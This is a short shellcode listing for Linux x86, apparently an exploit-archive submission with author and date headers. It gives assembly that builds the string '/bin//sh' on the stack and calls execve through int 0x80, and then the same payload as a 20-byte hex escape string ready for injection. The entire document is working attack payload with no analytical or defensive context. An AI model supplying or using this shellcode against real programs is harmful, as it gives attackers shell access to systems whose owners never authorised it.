;Category: Shellcode
;Title: GNU/Linux x86 - execve /bin/sh
;Author: Celal Doğan Duran
;Date: 07/08/2024
;Architecture: Linux x86



[SECTION .text]
 global _start
 _start:
 xor eax, eax
 push eax
 push 0x68732f2f
 push 0x6e69622f
 mov ebx, esp 
 push 0xb ; execve 11 -> 0xb
 pop eax
 int 80h

20 Bytes Shellcode 

\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x6A\x0B\x58\xCD\x80
